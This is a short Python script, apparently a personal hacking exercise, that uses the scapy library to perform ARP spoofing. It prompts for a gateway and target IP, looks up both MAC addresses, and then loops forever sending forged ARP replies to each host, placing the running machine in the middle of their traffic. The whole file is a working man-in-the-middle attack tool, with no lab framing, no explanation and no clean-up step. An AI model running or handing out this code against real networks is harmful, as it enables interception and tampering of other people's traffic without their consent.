import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
    arp_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
    scapy.send(arp_packet, verbose = 0)


def get_mac(ip):
    arp_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst = ip)
    reply, something = scapy.srp(arp_request, timeout = 3, verbose = 0)
    if reply:
        return reply[0][1].src
    return None

def wait_till_mac(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print(f"MAC address for {ip} not found. Retrying...")
    print(f"target MAC address found: {mac}")
    return mac

# gateway_ip = "10.0.0.138"
# target_ip = "10.0.0.33"

gateway_ip = input("Enter the gateway IP address: ")
target_ip = input("Enter the target IP address: ")

target_mac = wait_till_mac(target_ip)
gateway_mac = wait_till_mac(gateway_ip)


while True:
    spoof(target_ip, target_mac, gateway_ip)
    spoof(gateway_ip, gateway_mac, target_ip)   
    print("Spoofing is active.")